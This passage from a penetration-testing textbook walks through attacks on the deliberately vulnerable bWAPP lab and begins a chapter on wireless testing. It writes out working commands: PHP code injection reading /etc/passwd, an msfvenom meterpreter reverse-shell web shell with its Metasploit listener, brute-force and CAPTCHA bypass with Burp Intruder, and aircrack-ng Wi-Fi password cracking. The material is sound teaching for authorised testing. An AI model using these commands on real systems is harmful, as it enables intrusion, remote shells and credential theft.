    ![](images/Figure_6.14.png)

    Figure 6.14: Edit the default message by modifying the URL

3.  With PHP Code Injection, you can also access various information on the server. For example, you can list the directories by adding a semicolon (;) after test and using the command system(‘dir’); in the URL. Similarly, you can access passwords by using the command system(‘cat /etc/passwd’);. See [Figure 6.15](#ch06.xhtml_fig6-15):

    ![](images/Figure_6.15.png)

    Figure 6.15: Get list of the directories

4.  You can check the User/Group by using the command system(‘whoami’); in the URL, as shown in [Figure 6.16](#ch06.xhtml_fig6-16):

    ![](images/Figure_6.16.png)

    Figure 6.16: Check the User/Group

| Note: bWAPP is a web application designed to facilitate the testing of vulnerabilities, including those related to command and code injection. Users can access a variety of pages within the application to test for specific vulnerabilities, such as Command Injection (Shellshock), Command Injection (Time-Based), PHP Code Injection, XPath Injection, and Server-Side Includes (SSI) Injection. |

[Brute force at login](#contents.xhtml_sc3_158a)

Brute force login attack is a common type of cyberattack that involves an attacker repeatedly trying different username and password combinations to gain unauthorized access to an application or system. These attacks are often automated and can result in compromised user accounts or administrative functions.

To better understand brute force login attacks, let us look at an example using bWAPP. Here is a step-by-step approach to exploiting a brute force login vulnerability on bWAPP using Burp Suite Intruder:

1.  To begin, open bWAPP and navigate to the Login section. Enter the username bee and a random password such as test, as shown in [Figure 6.17](#ch06.xhtml_fig6-17):

    ![](images/Figure_6.17.png)

    Figure 6.17: Open bWAPP and navigate to the login section

2.  Next, open Burp Suite and configure it to intercept requests from your browser. Click the Login button to submit the request, and capture it in Burp Suite. To do this, right-click the captured request and select Send to Intruder, as demonstrated in [Figure 6.18](#ch06.xhtml_fig6-18):

    ![](images/Figure_6.18.png)

    Figure 6.18: Right-click the captured request and select Send to Intruder

3.  In the Intruder tab, navigate to the Positions section, and click on Clear $ to remove all parameters preselected by default. Then, individually pick each parameter, followed by clicking on Add $. In this instance, we have chosen the password parameter, illustrated in [Figure 6.19](#ch06.xhtml_fig6-19):

    ![](images/Figure_6.19.png)

    Figure 6.19: Go to the Positions tab and select the password field

4.  In the Payloads tab, select the Simple list payload type and enter a list of possible passwords to try, as shown in [Figure 6.20](#ch06.xhtml_fig6-20):

    ![](images/Figure_6.20.png)

    Figure 6.20: Enter a list of possible passwords to try

5.  Click Start Attack in the Intruder tab to begin the attack. Wait for the attack to complete, and then check the Results tab to see if any passwords were successful. The successful login will be indicated by a request with the payload bug that has a 302 redirection with the Location of the portal.php page. See [Figure 6.21](#ch06.xhtml_fig6-21):

    ![](images/Figure_6.21.png)

    Figure 6.21: Click Start Attack in the Intruder tab to begin the attack

| Note: There are several brute force attack tools available, including Burp Suite, Hydra, and Medusa, that are commonly used for penetration testing. However, it is important to note that certain weak practices for preventing brute force attacks, such as account lockout policies or IP rate limiting, may be bypassed by attackers using tactics like response time delays, user agent rotation, or dynamic IP addresses. |

[Broken authentication](#contents.xhtml_sc3_159a)

A prevalent vulnerability in web applications is broken authentication and session management, which enables attackers to circumvent the authentication and gain unauthorized access to user accounts or administrative functions. This vulnerability can arise due to various factors, including weak passwords, session fixation, or session hijacking.

For a more comprehensive learning of broken authentication, let us explore an example that employs bWAPP, as outlined in the following step-by-step approach:

1.  Navigate to the Broken Auth- Insecure Login Forms vulnerability in bWAPP and then click on Hack, as demonstrated in [Figure 6.22](#ch06.xhtml_fig6-22):

    ![](images/Figure_6.22.png)

    Figure 6.22: Navigate to the Broken Auth - Insecure Login Forms

2.  Right-click on the vulnerable page and select View Page Source, as depicted in [Figure 6.23](#ch06.xhtml_fig6-23):

    ![](images/Figure_6.23.png)

    Figure 6.23: Right-click on the vulnerable page and select View Page Source

3.  Examine the page’s source code for any noteworthy information. In this case, you will discover a hardcoded username tonystark and password I am Iron Man, as depicted in [Figure 6.24](#ch06.xhtml_fig6-24):

    ![](images/Figure_6.24.png)

    Figure 6.24: Discover hardcoded username and password

4.  Utilize the discovered credentials to log in to the account. Upon doing so, you will see a Successful login message displayed on the screen, as shown in [Figure 6.25](#ch06.xhtml_fig6-25):

    ![](images/Figure_6.25.png)

    Figure 6.25: Utilize the discovered credentials to log in to the account

| Note: Authentication flaws can lead to various security vulnerabilities in web applications, including session fixation, password spraying, credential stuffing, weak password complexity, and predictable session ID generation. Attackers can exploit these vulnerabilities to gain unauthorized access to sensitive user accounts and data. |

[Insecure Direct Object Reference](#contents.xhtml_sc3_160a)

Insecure Direct Object Reference (IDOR) is a type of vulnerability in web applications that can occur when an application exposes internal implementation objects, such as file or database keys, to the user interface without implementing proper authorization checks. This can enable attackers to gain access to sensitive data or functionalities they are not authorized to access.

To gain practical understanding of IDOR, we can take an example from bWAPP and follow the step-by-step approach explained below:

1.  Open the Insecure DOR (Change Secret) page on bWAPP and enter a New Secret as demonstrated in [Figure 6.26](#ch06.xhtml_fig6-26):

    ![](images/Figure_6.26.png)

    Figure 6.26: Open the Insecure DOR (Change Secret) page on bWAPP

2.  Activate Burp in proxy listening mode and intercept the request to obtain the username of the logged-in user, which can be modified as shown in [Figure 6.27](#ch06.xhtml_fig6-27):

    ![](images/Figure_6.27.png)

    Figure 6.27: Intercept the request to obtain the username of the logged-in user

3.  If you know the username of another user, modify the request to make changes to their account without proper authorization. Replace the targeted username and forward the request from Burp, as shown in [Figure 6.28](#ch06.xhtml_fig6-28):

    ![](images/Figure_6.28.png)

    Figure 6.28: Replace the targeted username

4.  If successful, the new secret key should be added to the targeted user’s account without proper authorization. Check the MySQL database (accessible through phpMyAdmin) to confirm that the secret for BPB’s account was changed from Bee’s account, exploiting the IDOR vulnerability as shown in [Figure 6.29](#ch06.xhtml_fig6-29):

    ![](images/Figure_6.29.png)

    Figure 6.29: Secret for BPB’s account was changed

5.  Upon reviewing the source code, it becomes apparent that there is no condition or validation in place, apart from a character filter, as demonstrated in [Figure 6.30](#ch06.xhtml_fig6-30):

    ![](images/Figure_6.30.png)

    Figure 6.30: No condition or validation in place

| Note: Web applications may contain IDOR vulnerabilities in several areas, such as user account management, access control mechanisms, file uploads, payment processing, and API endpoints. |

[XSS using XSS validator](#contents.xhtml_sc3_161a)

A web application vulnerability called Cross Site Scripting (XSS) can allow attackers to inject and execute malicious code within a victim’s browser. The vulnerability arises when user input is not properly sanitized, which enables attackers to inject code that will be executed by other users who view the affected page.

These attacks can be broadly classified into three categories:

*   Stored XSS: In this type of attack, the attacker injects malicious code into the web application’s server or database, which is then displayed to all users accessing that particular page. This type of attack can result in the compromise of sensitive data, such as login credentials, personal information, or financial data.

*   Reflected XSS: This type of attack involves injecting malicious code into a URL which is then reflected back to the user’s browser. The attacker typically tricks the victim into clicking on a link containing the malicious code, which then executes on the victim’s browser. Reflected XSS attacks can be difficult to detect and are commonly used in phishing scams.

*   DOM-based XSS: In this type of attack, the attacker injects malicious code into the Document Object Model (DOM) of a web page. This code is executed entirely on the client-side, and the attacker can manipulate the user’s interactions with the web page to execute the code. DOM-based XSS attacks are often used to steal sensitive data or to hijack user sessions.

XSS Validator is a powerful tool that helps detect and validate XSS vulnerabilities in web applications. bWAPP is a specially designed web application with deliberate vulnerabilities that can be used to learn and practice various security testing techniques, including exploiting XSS vulnerabilities. Here is a detailed step-by-step guide on how to exploit XSS vulnerabilities using XSS Validator on bWAPP:

1.  Open the bWAPP application and navigate to the XSS – Reflected (GET) page, which simulates a vulnerable application susceptible to reflected XSS attacks, as shown in [Figure 6.31](#ch06.xhtml_fig6-31):

    ![](images/Figure_6.31.png)

    Figure 6.31: Navigate to the Reflected XSS - GET page

2.  Intercept the request with random input and send it to the Intruder by right-clicking on the request. Select the Positions tab, and choose the first and second name parameters, as shown in [Figure 6.32](#ch06.xhtml_fig6-32):

    ![](images/Figure_6.32.png)

    Figure 6.32: Go to Positions tab and select the first and second name parameters

3.  Next, navigate to the Payloads tab and select the Payload type as Extension-generated. Then, choose the XSS Validator Payloads as the payload generator. Make sure to uncheck the URL encoding characters, as shown in [Figure 6.33](#ch06.xhtml_fig6-33):

    ![](images/Figure_6.33.png)

    Figure 6.33: Select the payload type as Extension-generated

4.  Now, go to the xssValidator and copy the Grep Phrase. Then, return to the Options tab in Intruder, as shown in [Figure 6.34](#ch06.xhtml_fig6-34):

    ![](images/Figure_6.34.png)

    Figure 6.34: Go to the XSS Validator and copy the Grep Phrase

5.  Remove all existing Grep-Match and add the Grep Phrase that was copied from the XSS Validator, as shown in [Figure 6.35](#ch06.xhtml_fig6-35):

    ![](images/Figure_6.35.png)

    Figure 6.35: Remove all existing Grep-Match

6.  Click on Start Attack, as indicated in the previous step, and the xssValidator will check all selected parameters against XSS. Additionally, ensure that you have selected the search responses for the payload strings option from the Grep Payloads section located in the Options tab of Intruder. See [Figure 6.36](#ch06.xhtml_fig6-36):

    ![](images/Figure_6.36.png)

    Figure 6.36: Sending a request for xxsValidator

7.  Check the status code and Response against every requested payload, as shown in [Figure 6.37](#ch06.xhtml_fig6-37):

    ![](images/Figure_6.37.png)

    Figure 6.37: Checking the status code and response against every requested payload

8.  Finally, right-click on the successful exploit response and select Show Response in Browser. Copy the URL and paste it in the browser to see the Reflected XSS payload pop up from the GET parameter, as shown in [Figure 6.38](#ch06.xhtml_fig6-38):

    ![](images/Figure_6.38.png)

    Figure 6.38: Reflected XSS

| Note: XSS Validator is a vital web application pen testing tool for identifying and validating XSS vulnerabilities. It can test input validation, DOM-based XSS detection, cookie and session validation, user input field validation, and HTML tags. |

[Backdoor via unrestricted file upload](#contents.xhtml_sc3_162a)

A web shell backdoor is a form of malicious software that enables unauthorized access to a web server or application through the uploading of a harmful script or executable file. Once the backdoor is established, the attacker gains remote command-line access to the affected system, enabling them to execute any command they desire and pilfer sensitive data.

To create a backdoor and obtain meterpreter, we will employ msfvenom to construct a payload, following the step-by-step approach explained below:

1.  Begin by launching the bWAPP application and access the Unrestricted File Upload page as shown in [Figure 6.39](#ch06.xhtml_fig6-39):

    ![](images/Figure_6.39.png)

    Figure 6.39: Access the unrestricted file upload page

2.  Open the Kali Linux terminal and enter the command msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.29.148 lport=4444 R > webshell.php to generate the PHP-based web shell backdoor payload. In this step, specify the connect-back IP, port, and payload type as displayed in [Figure 6.40](#ch06.xhtml_fig6-40):

    ![](images/Figure_6.40.png)

    Figure 6.40: Generate the PHP-based web shell backdoor payload

3.  Return to bWAPP and Upload the newly created webshell as demonstrated in [Figure 6.41](#ch06.xhtml_fig6-41):

    ![](images/Figure_6.41.png)

    Figure 6.41: Upload the newly created webshell

    Go back to Kali Linux and set up the listener by executing the following commands, as presented in [Figure 6.42](#ch06.xhtml_fig6-42). Once complete, start the listener. Here, we are essentially initializing the Metasploit listener, a function used to establish a connection with incoming reverse connection requests from the target. We need to define both the listening IP and the port for this purpose.

    Commands:

    mfconsole

    use exploit/multi/handler

    set payload php/meterpreter/reverse_tcp

    set lhost 192.168.29.148

    set lport 4444

    run

    ![](images/Figure_6.42.png)

    Figure 6.42: Set up the listener

4.  Proceed to the Upload page and choose the option to view the image, as indicated in step 2 above. This will trigger a redirection to a new link where the payload will be executed, as shown in [Figure 6.43](#ch06.xhtml_fig6-43):

    ![](images/Figure_6.43.png)

    Figure 6.43: Execute the payload

5.  Finally, revisit the listener interface to see the established meterpreter connection. Here, you can execute various commands as required and create persistence as demonstrated in [Figure 6.44](#ch06.xhtml_fig6-44):

    ![](images/Figure_6.44.png)

    Figure 6.44: Established meterpreter connection

| Note: An attacker can leverage web shell upload vulnerabilities in a web application to carry out severe security threats, including remote code execution, data theft, persistent unauthorized access, and website defacement. To prevent such attacks, it is essential to implement strict file upload restrictions, access controls, and input validation mechanisms in web applications. |

[HTTP parameter pollution](#contents.xhtml_sc3_163a)

A security vulnerability known as HTTP parameter pollution arises when a malicious attacker adds new parameters or modifies existing ones in an HTTP request. This exploit can bypass security measures, alter server-side functionality, modify user data, or execute arbitrary code. These actions may cause unintended or harmful behavior within the web application.

To illustrate the effects of HTTP parameter pollution, we will use the voting functionality within the bWAPP application. By adding an extra parameter to the URL, we can manipulate the voting mechanism. The following step-by-step guide outlines this process:

1.  Begin by opening bWAPP and navigating to the HTTP Parameter Pollution page, which is illustrated in [Figure 6.45](#ch06.xhtml_fig6-45):

    ![](images/Figure_6.45.png)

    Figure 6.45: Navigate to the HTTP parameter pollution page

2.  In the search box, enter the name Tony and click the continue button. This will display a list of movies, as shown in [Figure 6.46](#ch06.xhtml_fig6-46):

    ![](images/Figure_6.46.png)

    Figure 6.46: Enter the name Tony and click the continue button

3.  Next, select any movie and click on the Vote button. The resulting URL will look like this: [http://192.168.29.25/bwapp/hpp-3.php?movie=6&name=tony&action=vote,](http://192.168.29.25/bwapp/hpp-3.php?movie=6&name=tony&action=vote,)  which contains three parameters: movie, name, and action, as shown in [Figure 6.47](#ch06.xhtml_fig6-47):

    ![](images/Figure_6.47.png)

    Figure 6.47: Select any movie and click on the vote button

4.  Copy the same URL and add a new parameter, such as &movie=2, to create a modified URL like this: http://192.168.29.25/bwapp /hpp-3.php?movie=6&name=tony&action=vote&movie=2. Paste this modified URL into your browser’s address bar and run it. If HTTP Parameter Pollution is possible, the vote will be credited to movie 2 instead of movie 6, as demonstrated in [Figure 6.48](#ch06.xhtml_fig6-48):

    ![](images/Figure_6.48.png)

    Figure 6.48: Copy the same URL and add a new parameter

| Note: An exploit known as HTTP Parameter Pollution (HPP) can be used by attackers to manipulate URL parameters in a web application to execute various attacks, including bypassing security controls, accessing sensitive data, tampering with functionality, and launching DoS attacks. |

[Business logic flaws](#contents.xhtml_sc2_164a)

Business logic flaws are a type of software vulnerability in which an application’s design and logic are flawed, allowing attackers to manipulate the application’s intended behavior to their advantage. Compared to traditional vulnerabilities such as buffer overflows or SQL injections, business logic flaws can be more complex and difficult to detect, but they can have a greater impact once identified. They are specific to the application and its intended use; identifying and addressing business logic flaws requires a thorough understanding of the application’s design and intended functionality.

These flaws can lead to various security issues, including data theft, unauthorized access to sensitive information, and financial fraud. Examples of business logic flaws include manipulating transaction values, bypassing access controls, or altering user privileges. It is important for developers to thoroughly test applications to identify and address business logic flaws before they can be exploited by attackers. Additionally, ongoing monitoring and testing can help ensure that these vulnerabilities are not introduced or reintroduced during application updates or changes.

Let us take a basic example of a CAPTCHA bypass to illustrate how business logic flaws can be exploited in bWAPP. Follow the step-by-step approach explained below to understand this concept better:

1.  To start, open bWAPP and navigate to the Broken Auth. - CAPTCHA Bypassing page. Fill out the login form with random credentials and Captcha fields, and click on the Login button as depicted in [Figure 6.49](#ch06.xhtml_fig6-49):

    ![](images/Figure_6.49.png)

    Figure 6.49: Navigate to the Broken Auth. - CAPTCHA Bypassing page

2.  Intercept the login request and right-click on the page to send the request to Intruder. Click on the Positions tab and select the Clear button. Change the Attack type to Cluster bomb, and in the Position tab, select both the username and password as attack parameters, as shown in [Figure 6.50](#ch06.xhtml_fig6-50):

    ![](images/Figure_6.50.png)

    Figure 6.50: Change the Attack type to Cluster bomb

3.  Click on the Payloads tab and select Payload set 1. Set the Payload type to Simple list and add values such as test, bee, admin, and root to the Add text box, as shown in [Figure 6.51](#ch06.xhtml_fig6-51):

    ![](images/Figure_6.51.png)

    Figure 6.51: Select Payload set 1

4.  Select Payload set 2 and set the Payload type to Simple list. In the Add text box, include values like bug, test, and password. Due to the large number of combinations being tested, this attack may take a while to execute. See [Figure 6.52](#ch06.xhtml_fig6-52):

    ![](images/Figure_6.52.png)

    Figure 6.52: Select payload set 2

5.  Click on the Options tab and go to Grep - Match. Check the box next to Flag result items with responses matching these expressions. Click on Clear, then Yes, and add your comment. Ensure that Match type is set to Simple String and check the box next to Exclude HTTP Headers, as depicted in [Figure 6.53](#ch06.xhtml_fig6-53):

    ![](images/Figure_6.53.png)

    Figure 6.53: Click on the Options tab and go to Grep - Match

6.  Return to the Positions tab from the previous step and initiate the brute force attack by clicking on Start Attack. The brute forcing process will commence, as illustrated in [Figure 6.54](#ch06.xhtml_fig6-54):

    ![](images/Figure_6.54.png)

    Figure 6.54: Brute force attack

7.  Click on the Length tab and check the results for bee and bug. Then, click on the Response tab and search for the phrase successful login. Finally, click on the Render tab to see the successful login page in the UI. As a result, the Captcha mechanism has been successfully bypassed for the bee user, as shown in [Figure 6.55](#ch06.xhtml_fig6-55):

    ![](images/Figure_6.55.png)

    Figure 6.55: Check the results for bee and bug

| Note: Critical business logic vulnerabilities pose a significant threat to the security of web applications. These vulnerabilities can manifest in various forms, such as bypassing security controls, tampering with payments, escalating privileges, manipulating user input, and accessing sensitive data. |

[Conclusion](#contents.xhtml_sc2_165a)

In conclusion, this chapter is a comprehensive guide to web application exploitation, covering both basic and advanced-level vulnerability exploits. It highlights the importance of understanding web application vulnerabilities and how to exploit them, especially in today’s digital age where web applications have become an integral part of daily operations. The chapter explains common attack vectors, teaches how to create threat models for efficient testing, and provides the necessary knowledge to conduct sophisticated assessments. With this knowledge, web application auditors and penetration testers can better identify and exploit technical and business logic flows in web applications, and chain smaller vulnerabilities together to understand their impact.

In the next chapter, the pen tester will develop an in-depth understanding of exploiting wireless networks, including vulnerabilities, various attack types, and security mechanisms used to safeguard them. Moreover, pen tester will be exposed to advanced tools and techniques for wireless network analysis, allowing them to acquire crucial knowledge and skills to better protect themselves against wireless network attacks.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 7Exploiting Wireless Network](#contents.xhtml_ch07a)

[Introduction](#contents.xhtml_sc2_166a)

This chapter offers an extensive exploration of wireless network pentesting, encompassing a range of techniques, tools, and methodologies tailored to assess the security of diverse wireless networks, such as Wi-Fi and Bluetooth. The prime aim is to uncover vulnerabilities and potential threats inherent in these networks while establishing robust countermeasures for heightened security.

[Structure](#contents.xhtml_sc2_167a)

In this chapter, we will discuss the following topics:

*   Introduction to wireless pentesting

*   Wireless network fundamentals

    *   Wireless networks and protocols overview

    *   Wireless network topologies and architectures

    *   Radio frequency fundamentals

*   Wireless security threats and standards

    *   Common wireless security threats

*   Wireless security overview

*   Wireless pen testing methodology

    *   Steps involved in wireless pentesting

    *   Approach to wireless pentesting

*   Wireless pen testing tools

    *   Overview of wireless pen testing tools

    *   Common wireless pen testing tools

*   Configuring Kali Linux for wireless pentesting

    *   Preparing Kali Linux for wireless pentesting

    *   Configuring Kali Linux for wireless attacks

*   Wireless network exploitation techniques

    *   Compromising WPA/WPA2 encryption

    *   Man-in-the-Middle attacks with rogue access points

    *   Bypassing hidden SSIDs

    *   Bypassing MAC and open authentication

    *   Denial-of-Service attacks

*   Advanced wireless attacks

    *   Attacking wireless routers with Reaver

[Objectives](#contents.xhtml_sc2_168a)

The objective of this chapter is two-fold. Firstly, it provides practical insights into wireless network penetration testing, encompassing a holistic sequence—from initial reconnaissance and data gathering to vulnerability scanning, exploitation, comprehensive reporting, and efficient remediation. Secondly, the chapter underlines the paramount importance of adhering to a structured and industry-recognized approach to wireless network pentesting, ensuring meticulous and accurate evaluations of security landscapes.

[Introduction to wireless pentesting](#contents.xhtml_sc2_169a)

Wireless networks are vulnerable to a wide range of threats, including eavesdropping, Man-in-the-Middle (MITM) Attacks, Denial-of-Service (DoS) Attacks, and rogue access points. Despite the convenience and mobility that wireless networks offer, security must be a top priority for anyone using them. To address these security concerns, wireless penetration testing has become essential. This process involves assessing the security of wireless networks to identify vulnerabilities and evaluate the effectiveness of existing security measures. For organizations that rely on wireless networks to transmit sensitive data, wireless pen testing is particularly crucial.

Kali Linux is a popular distribution of Linux that is designed specifically for penetration testing and security assessments, with a focus on wireless network security. It includes a wide range of tools for wireless pentesting, making it a valuable resource for anyone looking to test their wireless network security.

| Note: Exercise caution and prioritize safety, privacy, and ethical considerations when conducting Wi-Fi pen testing to minimize disruption and potential harm to legitimate users and networks. |

[Wireless network fundamentals](#contents.xhtml_sc2_170a)

To conduct advanced penetration testing successfully, it is essential to have a solid grounding in wireless network fundamentals. Given that wireless networks have become ubiquitous in modern life, understanding their functioning is critical to detecting vulnerabilities and testing their security measures.

[Wireless networks and protocols overview](#contents.xhtml_sc3_171a)

A thorough grasp of wireless network fundamentals is found in an all-encompassing understanding of wireless networks and protocols. This encompasses gaining an overview of diverse wireless communication technologies, like Wi-Fi and Bluetooth, and how they function. It is crucial to comprehend the underlying protocols to identify potential vulnerabilities and test security measures effectively.

[Wireless network topologies and architectures](#contents.xhtml_sc3_172a)

Wireless network topologies and architectures constitute another critical aspect of wireless network fundamentals. This involves grasping the structure of networks to understand how devices interact with each other. Advanced penetration testers need to have the ability to scrutinize and pinpoint vulnerabilities across a spectrum of network topologies, ranging from uncomplicated point-to-point connections to intricate mesh networks.

[Radio Frequency fundamentals](#contents.xhtml_sc3_173a)

Knowing Radio Frequency (RF) basics is important for wireless network penetration testing. RF technology is key for wireless communications, and understanding its principles helps spot security risks. This means learning about different frequencies in wireless networks, how they move, and how they can be used to find vulnerabilities.

[Wireless security threats and standards](#contents.xhtml_sc2_174a)

In advanced penetration testing, having knowledge of wireless security threats and standards is crucial. As wireless networks are extensively utilized, they have become a favored target of attackers. Therefore, it is vital to have an understanding of common wireless security threats that exist, which would aid in recognizing vulnerabilities and evaluating the effectiveness of security measures.

[Common wireless security threats](#contents.xhtml_sc3_175a)

Wireless networks are vulnerable to various security threats such as eavesdropping, Man In The Middle (MITM) Attacks, DoS Attacks, rogue access points, and password attacks. Having knowledge of these threats and the harm they can cause is pivotal for conducting a thorough security assessment of wireless networks.

[Wireless security overview](#contents.xhtml_sc3_176a)

Wireless security standards and vulnerabilities are also crucial for a thorough understanding of wireless network security. While standards such as WPA2 and WPA3 have been put in place to enhance wireless security, they are not immune to exploitation by attackers. Therefore, it is important to recognize the potential vulnerabilities in these standards and how they can be exploited.

[Wireless pen testing methodology](#contents.xhtml_sc2_177a)

As a critical constituent of advanced penetration testing, wireless pen testing involves scrutinizing the security of wireless networks and devices. Employing a structured approach to testing wireless security, the wireless pen testing methodology plays a pivotal role in detecting vulnerabilities in wireless networks and devices.

[Steps involved in wireless pentesting](#contents.xhtml_sc3_178a)

The wireless pen testing methodology consists of a series of sequential steps to effectively identify vulnerabilities in wireless networks and devices, illustrated in [Figure 7.1](#ch07.xhtml_fig7-1):

![](images/Figure_7.1_.png)

Figure 7.1: Steps involved in wireless pentesting

1.  Reconnaissance: Reconnaissance involves collecting information about the wireless network and connected devices, including the SSID, encryption type, and other pertinent details.

2.  Enumeration: Enumeration involves identifying the services running on the wireless network and devices, including open ports and protocols.

3.  Vulnerability assessment: Vulnerability assessment entails identifying potential weaknesses in the wireless network and devices, including vulnerabilities in client devices and APs, as well as encryption vulnerabilities.

4.  Exploitation: In this step, the tester tries to take advantage of the weaknesses found earlier. This could involve things like bypassing wireless network encryption or getting into devices and networks without permission.

5.  Reporting: Reporting involves documenting the findings and actions taken during the testing process to provide a comprehensive report of the identified vulnerabilities.

[Approach to wireless pentesting](#contents.xhtml_sc3_179a)

To achieve a successful wireless pen testing engagement, it is crucial to consider the following factors, as the approach to wireless pen testing may vary depending on the organization’s goals. See [Figure 7.2](#ch07.xhtml_fig7-2):

![](images/Figure_7.2_.png)

Figure 7.2: Approach to wireless pentesting

1.  Define objectives: It is a crucial step in identifying the desired information and actions based on the test results. This helps to align the testing activities with the organization’s goals and requirements.

2.  Obtain permission: Before conducting any wireless pen testing activities, the tester must obtain permission from the organization or the owner of the wireless network. This helps to avoid any legal issues that may arise due to unauthorized testing activities.

3.  Conduct testing ethically: It is essential to conduct wireless pen testing with integrity and ethics by using appropriate tools and techniques. The tester should avoid causing any damage to the wireless network or devices and adhere to the testing guidelines and standards.

4.  Report results: Reporting the results accurately and in a timely manner is crucial. The report should include detailed findings, recommendations to improve the security of the wireless network and devices, and any potential risks or vulnerabilities that may be present. This helps the organization to take appropriate measures to mitigate the risks and enhance the security posture.

[Wireless pen testing tools](#contents.xhtml_sc2_180a)

Conducting effective and precise wireless network and device testing necessitates the use of wireless pen testing tools. Various types of tools are employed in wireless pentesting, which we will explore in this segment.

[Overview of wireless pen testing tools](#contents.xhtml_sc3_181a)

Identifying vulnerabilities in wireless networks and devices is made possible by using wireless pen testing tools, which come in the form of software or hardware. These tools are created to mimic actual attacks and furnish comprehensive data on the wireless network’s security stance. Pinpointing potential weaknesses in APs, client devices, and the wireless network itself is the main objective of using these tools.

[Common wireless pen testing tools](#contents.xhtml_sc3_182a)

Wireless pen testing entails utilizing a variety of software and hardware tools to simulate real-world attacks and gain valuable insights into the security posture of the network. Several widely used tools in wireless pen testing include:

*   Aircrack-ng: This tool is capable of cracking WEP and WPA/WPA2-PSK encryption keys. Moreover, it can capture and analyze network traffic to identify potential vulnerabilities and security issues.

*   Wireshark: Wireshark is a powerful network protocol analyzer that allows testers to capture and analyze network traffic. It provides detailed information on the transmitted and received packets, making it an effective tool in identifying security threats and vulnerabilities.

*   Kismet: Kismet functions as a wireless network detector, sniffer, and intrusion detection system. It can detect hidden wireless networks, unauthorized access points, and other security threats within the wireless network.

*   NetStumbler: NetStumbler is a tool that can identify wireless networks and access points while also detecting security vulnerabilities in the wireless network.

*   Reaver: Reaver is a tool that exploits a vulnerability in WPS-enabled wireless networks to recover the WPA/WPA2 passphrase. It is particularly useful in assessing the security of such networks.

| Note: Adopt a standard wireless pen testing approach by following recognized methodologies like OWASP Wireless Security Testing Guide. Stay updated with the latest tools and techniques for effective and thorough testing. |

[Configuring Kali Linux for wireless pentesting](#contents.xhtml_sc2_183a)

Effective wireless pen testing requires the proper configuration of Kali Linux for wireless attacks. This setup allows testers to mimic real-world situations, pinpoint vulnerabilities, and comprehensively assess the security of wireless networks. Preparing Kali Linux for wireless pentesting

To begin the wireless pen testing process, it is vital to verify that Kali Linux is correctly configured. Follow the steps below to ensure proper configuration:

1.  To update and upgrade the Kali Linux operating system, you need to run the command sudo apt-get update && sudo apt-get upgrade. This command is shown in [Figure 7.3](#ch07.xhtml_fig7-3):

    ![](images/Figure_7.3_.png)

    Figure 7.3: Updating and upgrading the Kali Linux

2.  To install the necessary wireless drivers, run the command sudo apt-get install firmware-iwlwifi.

    | Note: Please note that you may require drive installation depending on the wireless adapter you are using. |

    See [Figure 7.4](#ch07.xhtml_fig7-4):

    ![](images/Figure_7.4_.png)

    Figure 7.4: Installing the required wireless drivers

3.  To verify the availability of the wireless interface, you can run the command iwconfig shown in [Figure 7.5](#ch07.xhtml_fig7-5):

    ![](images/Figure_7.5_.png)

    Figure 7.5: Verifying the availability of the wireless interface

4.  To install the necessary tools, run the command sudo apt-get install aircrack-ng wireshark kismet reaver. This command is shown in [Figure 7.6](#ch07.xhtml_fig7-6):

    ![](images/Figure_7.6_.png)

    Figure 7.6: Installing the necessary tools

Once you have installed these tools, you can proceed with the configuration of Kali Linux for wireless attacks.

[Configuring Kali Linux for wireless attacks](#contents.xhtml_sc3_184a)

With Kali Linux now properly prepared, the next step is to configure it for wireless attacks. Follow the steps given below:

1.  Start by opening a terminal or command prompt on your computer. Execute the command sudo ifconfig wlan0 down to deactivate the wireless LAN interface. Refer to [Figure 7.7](#ch07.xhtml_fig7-7) for visual guidance:

    ![](images/Figure_7.7_.png)

    Figure 7.7: Deactivating the wireless LAN interface

2.  Use the command sudo airmon-ng check kill to check for interfering processes and terminate them if detected. Consult [Figure 7.8](#ch07.xhtml_fig7-8) for a visual reference:

    ![](images/Figure_7.8_.png)

    Figure 7.8: Checking for interfering processes

3.  Set the wireless LAN interface to monitor mode by running the command sudo iwconfig wlan0 mode monitor. Additionally, take note that we require an additional adapter that supports monitoring mode. Visual instructions can be found in [Figure 7.9](#ch07.xhtml_fig7-9):

    ![](images/Figure_7.9_.png)

    Figure 7.9: Wireless LAN interface to monitor mode

4.  Activate the wireless LAN interface with the command sudo ifconfig wlan0 up. See [Figure 7.10](#ch07.xhtml_fig7-10) for a visual representation:

    ![](images/Figure_7.10_.png)

    Figure 7.10: Activating the wireless LAN interface

5.  Verify that the interface is in monitor mode by running the command iwconfig as shown in [Figure 7.11](#ch07.xhtml_fig7-11):

    ![](images/Figure_7.11_.png)

    Figure 7.11: Verifying that the interface is in monitor mode

6.  Scan for available wireless networks using the command sudo airodump-ng wlan0 as shown in [Figure 7.12](#ch07.xhtml_fig7-12) and 7.13:

    The command is depicted in [Figure 7.12](#ch07.xhtml_fig7-12) below:

    ![](images/Figure_7.12_.png)

    Figure 7.12: Command to see available wireless networks

    In [Figure 7.13](#ch07.xhtml_fig7-13), you can see the available wireless networks along with their BSSID and ESSID:

    ![](images/Figure_7.13_.png)

    Figure 7.13: Scanning for available wireless networks (output)

7.  Select the target network and capture the packets using the command sudo airodump-ng --bssid <target_BSSID> -c <channel> -w <output_file> wlan0 as shown in [Figure 7.14](#ch07.xhtml_fig7-14) and [7.15](#ch07.xhtml_fig7-15): Here BSSID stands for Basic Service Set Identifier.

    [Figure 7.14](#ch07.xhtml_fig7-14) illustrates the command required for packet capturing:

    ![](images/Figure_7.14_.png)

    Figure 7.14: Command to start capturing the packets

    [Figure 7.15](#ch07.xhtml_fig7-15) below depicts the captured packets in detail:

    ![](images/Figure_7.15_.png)

    Figure 7.15: Selecting target network and capturing the packets (output)

8.  Once enough packets have been captured, use aircrack-ng to crack the wireless password by using the command sudo aircrack-ng -w <wordlist> <output_file.cap> as shown in [Figure 7.16](#ch07.xhtml_fig7-16) and 7.17:

    [Figure 7.16](#ch07.xhtml_fig7-16) illustrates the command required for password cracking:

    ![](images/Figure_7.16_.png)

    Figure 7.16: Command to crack wireless password

    [Figure 7.17](#ch07.xhtml_fig7-17) displays the output of the command for password cracking:

    ![](images/Figure_7.17_.png)

    Figure 7.17: Crack the wireless password (output)

